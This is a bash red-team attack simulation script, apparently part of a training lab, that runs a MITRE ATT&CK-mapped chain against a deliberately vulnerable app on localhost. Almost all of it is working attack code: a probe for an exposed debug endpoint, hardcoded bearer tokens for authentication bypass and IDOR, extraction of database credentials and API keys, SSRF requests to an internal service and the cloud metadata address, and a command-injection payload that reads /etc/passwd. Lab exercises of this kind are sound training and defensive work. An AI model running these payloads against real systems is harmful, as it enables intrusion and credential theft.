#!/usr/bin/env bash
# =============================================================================
# red_team_attack.sh - Red Team Attack Simulation
# =============================================================================
# MITRE ATT&CK mapped attack chain against the vulnerable application.
# Target: http://localhost:8888 (vulnerable app in DMZ)
# =============================================================================

set -euo pipefail

TARGET="http://localhost:8888"
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

echo -e "${RED}${BOLD}========================================${NC}"
echo -e "${RED}${BOLD}  RED TEAM ATTACK SIMULATION${NC}"
echo -e "${RED}${BOLD}  Target: ${TARGET}${NC}"
echo -e "${RED}${BOLD}========================================${NC}"

# ================================================
# PHASE 1: RECONNAISSANCE (T1595, T1082)
# ================================================
echo ""
echo -e "${YELLOW}${BOLD}[PHASE 1] RECONNAISSANCE${NC}"
echo -e "  MITRE ATT&CK: T1595 - Active Scanning, T1082 - System Info Discovery"
echo ""

echo -e "  ${RED}[ATTACK]${NC} Discovering API endpoints..."
RECON=$(curl -s $TARGET 2>/dev/null || echo '{}')
echo "  Response: $(echo $RECON | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get("endpoints", []))' 2>/dev/null || echo 'N/A')"
echo ""

echo -e "  ${RED}[ATTACK]${NC} Checking for debug endpoints..."
DEBUG=$(curl -s $TARGET/debug/env 2>/dev/null || echo '{}')
if echo "$DEBUG" | grep -q "environment"; then
    echo -e "  ${RED}[VULN]${NC} DEBUG ENDPOINT FOUND! Environment variables exposed."
else
    echo -e "  ${CYAN}[INFO]${NC} Debug endpoint not accessible"
fi

# ================================================
# PHASE 2: INITIAL ACCESS (T1190)
# ================================================
echo ""
echo -e "${YELLOW}${BOLD}[PHASE 2] INITIAL ACCESS${NC}"
echo -e "  MITRE ATT&CK: T1190 - Exploit Public-Facing Application"
echo ""

echo -e "  ${RED}[ATTACK]${NC} Testing authentication with known token patterns..."
RESPONSE=$(curl -s -H "Authorization: Bearer admin-token-12345" $TARGET/api/data 2>/dev/null || echo '{}')
if echo "$RESPONSE" | grep -q "Authorized"; then
    echo -e "  ${RED}[VULN]${NC} Token accepted! Access granted with known token."
    echo "  Data: $(echo $RESPONSE | python3 -c 'import sys,json; print(json.load(sys.stdin).get("message",""))' 2>/dev/null)"
else
    echo -e "  ${CYAN}[INFO]${NC} Token rejected or service unavailable"
fi

# ================================================
# PHASE 3: PRIVILEGE ESCALATION (T1548)
# ================================================
echo ""
echo -e "${YELLOW}${BOLD}[PHASE 3] PRIVILEGE ESCALATION${NC}"
echo -e "  MITRE ATT&CK: T1548 - Abuse Elevation Control Mechanism"
echo ""

echo -e "  ${RED}[ATTACK]${NC} Testing IDOR - Using USER token on ADMIN endpoint..."
ADMIN_RESPONSE=$(curl -s -H "Authorization: Bearer user-token-67890" $TARGET/api/admin 2>/dev/null || echo '{}')
if echo "$ADMIN_RESPONSE" | grep -q "sensitive\|Admin panel"; then
    echo -e "  ${RED}[VULN]${NC} IDOR FOUND! User token grants admin access!"
    echo "  Sensitive keys found: $(echo $ADMIN_RESPONSE | python3 -c 'import sys,json; d=json.load(sys.stdin); print(list(d.get("sensitive",{}).keys()))' 2>/dev/null || echo 'N/A')"
else
    echo -e "  ${CYAN}[INFO]${NC} Admin endpoint properly restricted or unavailable"
fi

# ================================================
# PHASE 4: CREDENTIAL ACCESS (T1552)
# ================================================
echo ""
echo -e "${YELLOW}${BOLD}[PHASE 4] CREDENTIAL ACCESS${NC}"
echo -e "  MITRE ATT&CK: T1552 - Unsecured Credentials"
echo ""

echo -e "  ${RED}[ATTACK]${NC} Extracting credentials from admin response..."
if echo "$ADMIN_RESPONSE" | grep -q "database_credentials"; then
    echo -e "  ${RED}[VULN]${NC} Database credentials found:"
    echo "$ADMIN_RESPONSE" | python3 -c "
import sys, json
d = json.load(sys.stdin)
creds = d.get('sensitive', {}).get('database_credentials', {})
for k, v in creds.items():
    print(f'    {k}: {v}')
" 2>/dev/null || echo "    (unable to parse)"

    echo ""
    echo -e "  ${RED}[VULN]${NC} API keys found:"
    echo "$ADMIN_RESPONSE" | python3 -c "
import sys, json
d = json.load(sys.stdin)
keys = d.get('sensitive', {}).get('api_keys', {})
for k, v in keys.items():
    print(f'    {k}: {v}')
" 2>/dev/null || echo "    (unable to parse)"
fi

# ================================================
# PHASE 5: SSRF (T1190)
# ================================================
echo ""
echo -e "${YELLOW}${BOLD}[PHASE 5] SERVER-SIDE REQUEST FORGERY${NC}"
echo -e "  MITRE ATT&CK: T1190 - SSRF via Public-Facing Application"
echo ""

echo -e "  ${RED}[ATTACK]${NC} Attempting SSRF to internal services..."
curl -s "$TARGET/api/search?url=http://172.20.2.30:5000/api/secrets" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "    (no response)"
echo ""

echo -e "  ${RED}[ATTACK]${NC} Attempting SSRF to cloud metadata..."
curl -s "$TARGET/api/search?url=http://169.254.169.254/latest/meta-data/" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "    (no response)"

# ================================================
# PHASE 6: COMMAND INJECTION (T1059)
# ================================================
echo ""
echo -e "${YELLOW}${BOLD}[PHASE 6] COMMAND INJECTION${NC}"
echo -e "  MITRE ATT&CK: T1059 - Command and Scripting Interpreter"
echo ""

echo -e "  ${RED}[ATTACK]${NC} Testing command injection via ping endpoint..."
curl -s -X POST $TARGET/api/ping \
    -H "Content-Type: application/json" \
    -d '{"host": "8.8.8.8; cat /etc/passwd"}' 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "    (no response)"

# ================================================
# SUMMARY
# ================================================
echo ""
echo -e "${RED}${BOLD}========================================${NC}"
echo -e "${RED}${BOLD}  ATTACK SUMMARY${NC}"
echo -e "${RED}${BOLD}========================================${NC}"
echo -e "  Vulnerabilities Found:"
echo -e "    1. Information Disclosure - Debug endpoint exposed"
echo -e "    2. Broken Authentication - Weak token mechanism"
echo -e "    3. Broken Access Control - IDOR (user->admin)"
echo -e "    4. Unsecured Credentials - API keys & DB creds in response"
echo -e "    5. SSRF - Server-side request forgery possible"
echo -e "    6. Command Injection - Unsanitized input"
echo ""
echo -e "  ${BOLD}MITRE ATT&CK Techniques Used:${NC}"
echo -e "    T1595 - Active Scanning"
echo -e "    T1082 - System Information Discovery"
echo -e "    T1190 - Exploit Public-Facing Application"
echo -e "    T1548 - Abuse Elevation Control"
echo -e "    T1552 - Unsecured Credentials"
echo -e "    T1059 - Command Injection"
echo ""
echo -e "  ${YELLOW}Blue Team: Check SIEM Dashboard (http://localhost:5601) for alerts!${NC}"
echo ""
